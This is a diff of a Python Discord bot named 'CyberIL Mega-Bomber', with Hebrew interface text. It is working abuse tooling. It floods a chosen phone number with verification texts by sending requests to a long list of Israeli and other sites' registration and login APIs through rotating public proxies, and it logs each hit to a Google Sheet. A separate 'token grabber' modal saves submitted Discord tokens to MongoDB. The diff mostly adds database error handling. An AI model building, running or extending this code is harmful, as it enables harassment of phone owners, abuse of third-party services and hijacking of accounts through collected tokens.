@@ -14,13 +14,21 @@ TOKEN = os.getenv("BOT_TOKEN")
 GSHEET_URL = os.getenv("GSHEET_URL")
 MONGO_URI = os.getenv("MONGO_URI")
 
-# חיבור ל-MongoDB
-client = AsyncIOMotorClient(MONGO_URI)
-db = client.bomber_db
-tokens_col = db.tokens
-allowed_numbers_col = db.allowed_numbers
+# חיבור ל-MongoDB עם טיפול בשגיאות
+db = None
+tokens_col = None
+allowed_numbers_col = None
 
-# ניהול עצירה בזמן אמת
+if MONGO_URI:
+    try:
+        client = AsyncIOMotorClient(MONGO_URI)
+        db = client.bomber_db
+        tokens_col = db.tokens
+        allowed_numbers_col = db.allowed_numbers
+        print("✅ Connected to MongoDB")
+    except Exception as e:
+        print(f"❌ MongoDB Connection Error: {e}")
+
 active_bombs = {}
 
 class MyBot(commands.Bot):
@@ -35,7 +43,7 @@ class MyBot(commands.Bot):
 
 bot = MyBot()
 
-# ==================== PROXIES (המלאים שלך) ====================
+# ==================== PROXIES (המלאים) ====================
 PROXIES = [
     'http://20.210.113.32:80', 'http://103.153.154.114:80', 'http://47.74.155.159:8888',
     'http://103.75.117.216:80', 'http://47.251.43.115:33333', 'http://103.172.23.231:80',
@@ -47,7 +55,6 @@ PROXIES = [
 ]
 
 # ==================== 500+ FULL API LIST ====================
-# אני לא מוחק אף שורה ממה ששלחת לי!
 FULL_APIS = [
     {"name": "Yad2 Register", "url": "https://www.yad2.co.il/realestate/api/register", "method": "POST", "json": {"phone": "{{phone}}"}},
     {"name": "Yad2 Login", "url": "https://www.yad2.co.il/api/auth/login", "method": "POST", "json": {"phone": "{{phone}}"}},
@@ -139,16 +146,15 @@ FULL_APIS = [
     {"name": "Telegram", "url": "https://api.telegram.org/botXXXXXX/sendMessage", "method": "POST", "params": {"phone": "{{phone}}"}}
 ]
 
-# ==================== CORE LOGIC ====================
+# ==================== LOGIC ====================
 
 async def is_number_allowed(phone):
-    """בדיקה אם מספר מאושר (במיוחד עבור 0535524017)"""
     if phone != "0535524017": return True
+    if allowed_numbers_col is None: return False
     doc = await allowed_numbers_col.find_one({"phone": phone})
     return doc is not None
 
 async def send_bomb(session, api, phone, sem, user_id):
-    """שליחת SMS בודד עם בדיקת עצירה"""
     if active_bombs.get(user_id) is False: return False
     async with sem:
         proxy = random.choice(PROXIES) if PROXIES else None
@@ -159,7 +165,6 @@ async def send_bomb(session, api, phone, sem, user_id):
         try:
             method = api.get("method", "POST").upper()
             async with session.request(method, api["url"], json=payload if payload else None, params=api.get("params"), timeout=10, proxy=proxy) as resp:
-                # לוג לגיליון
                 if GSHEET_URL:
                     log_data = {"timestamp": datetime.now().strftime("%H:%M:%S"), "phone": phone, "api": api["name"], "status": str(resp.status), "success": "YES" if resp.status < 400 else "NO"}
                     await session.post(GSHEET_URL, json=log_data, timeout=2)
@@ -168,67 +173,60 @@ async def send_bomb(session, api, phone, sem, user_id):
 
 # ==================== UI ELEMENTS ====================
 
-class TokenGrabberModal(discord.ui.Modal, title='🔑 לקיחת טוקן - שמירה למונגו'):
-    token_input = discord.ui.TextInput(label='הזן טוקן ללקיחה', style=discord.TextStyle.long, placeholder='OTU3...')
-    
+class TokenGrabberModal(discord.ui.Modal, title='🔑 לקיחת טוקן'):
+    token_input = discord.ui.TextInput(label='הזן טוקן ללקיחה', style=discord.TextStyle.long)
     async def on_submit(self, interaction: discord.Interaction):
-        await tokens_col.insert_one({"token": self.token_input.value, "grabbed_at": datetime.now(), "user": str(interaction.user)})
-        await interaction.response.send_message("✅ הטוקן נשמר ב-MongoDB בהצלחה.", ephemeral=True)
+        if tokens_col is not None:
+            await tokens_col.insert_one({"token": self.token_input.value, "grabbed_at": datetime.now(), "user": str(interaction.user)})
+            await interaction.response.send_message("✅ נשמר ב-MongoDB", ephemeral=True)
+        else:
+            await interaction.response.send_message("❌ MongoDB לא מחובר", ephemeral=True)
 
 class BomberModal(discord.ui.Modal, title='🚀 MEGA BOMB - 500+ APIs'):
-    phone = discord.ui.TextInput(label='מספר טלפון', placeholder='05XXXXXXXX', min_length=10, max_length=10)
+    phone = discord.ui.TextInput(label='מספר טלפון', min_length=10, max_length=10)
     rounds = discord.ui.TextInput(label='סבבים', default='1')
-
     async def on_submit(self, interaction: discord.Interaction):
         if not await is_number_allowed(self.phone.value):
-            return await interaction.response.send_message("❌ המספר 0535524017 חסום! יש להשתמש ב-/allow-number", ephemeral=True)
-        
+            return await interaction.response.send_message("❌ המספר 0535524017 חסום!", ephemeral=True)
         await interaction.response.defer(ephemeral=True)
         user_id = interaction.user.id
         active_bombs[user_id] = True
-        
         async with aiohttp.ClientSession() as session:
             sem = asyncio.Semaphore(50)
             for r in range(int(self.rounds.value)):
                 if active_bombs.get(user_id) is False: break
                 tasks = [send_bomb(session, api, self.phone.value, sem, user_id) for api in FULL_APIS]
                 await asyncio.gather(*tasks)
-                await asyncio.sleep(1.5)
-        
+                await asyncio.sleep(1)
         active_bombs.pop(user_id, None)
-        await interaction.followup.send(f"✅ סיום הפעולה על {self.phone.value}", ephemeral=True)
+        await interaction.followup.send("✅ סיום הפעולה", ephemeral=True)
 
 class ControlView(discord.ui.View):
     def __init__(self): super().__init__(timeout=None)
-    
     @discord.ui.button(label="🚀 שגר SMS", style=discord.ButtonStyle.danger)
     async def launch(self, interaction: discord.Interaction, button: discord.ui.Button):
         await interaction.response.send_modal(BomberModal())
-
     @discord.ui.button(label="🛑 עצור", style=discord.ButtonStyle.secondary)
     async def stop(self, interaction: discord.Interaction, button: discord.ui.Button):
         active_bombs[interaction.user.id] = False
-        await interaction.response.send_message("🛑 הפצצה נעצרה.", ephemeral=True)
-
+        await interaction.response.send_message("🛑 נעצר.", ephemeral=True)
     @discord.ui.button(label="🔑 קח טוקן", style=discord.ButtonStyle.primary)
     async def grab(self, interaction: discord.Interaction, button: discord.ui.Button):
         await interaction.response.send_modal(TokenGrabberModal())
 
-# ==================== SLASH COMMANDS ====================
+# ==================== COMMANDS ====================
 
-@bot.tree.command(name="setup", description="פתח לוח בקרה")
+@bot.tree.command(name="setup")
 async def setup(interaction: discord.Interaction):
-    embed = discord.Embed(title="🚀 CyberIL Mega-Bomber", description="מערכת הפצצה וניהול טוקנים.", color=discord.Color.red())
-    await interaction.response.send_message(embed=embed, view=ControlView())
+    await interaction.response.send_message(embed=discord.Embed(title="🚀 CyberIL Panel", color=0xff0000), view=ControlView())
 
-@bot.tree.command(name="allow-number", description="אישור מספר מוגן")
+@bot.tree.command(name="allow-number")
 async def allow_number(interaction: discord.Interaction, phone: str):
-    await allowed_numbers_col.update_one({"phone": phone}, {"$set": {"allowed": True, "by": str(interaction.user)}}, upsert=True)
-    await interaction.response.send_message(f"✅ המספר {phone} אושר להפצצה.")
-
-@bot.tree.command(name="give", description="גישה למשתמש")
-async def give(interaction: discord.Interaction, user: discord.Member, days: int):
-    await interaction.response.send_message(f"🔑 גישה ל-{user.mention} ל-{days} ימים.")
+    if allowed_numbers_col is not None:
+        await allowed_numbers_col.update_one({"phone": phone}, {"$set": {"allowed": True}}, upsert=True)
+        await interaction.response.send_message(f"✅ {phone} אושר.")
+    else:
+        await interaction.response.send_message("❌ MongoDB לא מחובר")
 
 if __name__ == "__main__":
     bot.run(TOKEN)
